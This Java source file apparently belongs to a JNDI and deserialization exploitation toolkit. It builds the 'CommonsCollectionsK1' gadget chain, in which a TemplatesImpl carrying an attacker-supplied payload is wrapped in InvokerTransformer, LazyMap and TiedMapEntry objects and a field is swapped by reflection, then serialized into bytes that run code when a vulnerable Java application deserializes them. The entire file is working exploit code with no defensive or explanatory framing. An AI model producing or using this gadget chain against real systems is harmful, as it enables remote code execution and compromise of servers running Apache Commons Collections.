package sonomon.jndi.deser.gadgets;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import java.util.HashMap;
import java.util.Map;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import sonomon.jndi.deser.Deserialize;
import sonomon.jndi.factory.FactoryUtils;

public class CommonsCollectionsK1 implements SerializeObject{
	public Object getJavaSerializeObject(String payload, String jarname) throws Exception {
		TemplatesImpl tempImpl = Deserialize.getTemplatesImpl(payload);
	    InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
	    HashMap<String, String> innerMap = new HashMap<String, String>();
	    Map m = LazyMap.decorate(innerMap, (Transformer)transformer);
	    Map<Object, Object> outerMap = new HashMap<Object, Object>();
	    TiedMapEntry tied = new TiedMapEntry(m, tempImpl);
	    outerMap.put(tied, "t");
	    innerMap.clear();
	    Deserialize.setFieldValue(transformer, "iMethodName", "newTransformer");
        return outerMap;
    }
	public byte[] getJavaSerializeData(String payload, String jarname) throws Exception {
		byte[] bs = FactoryUtils.objectToBytes(getJavaSerializeObject(payload, jarname));
		return bs;
	}
}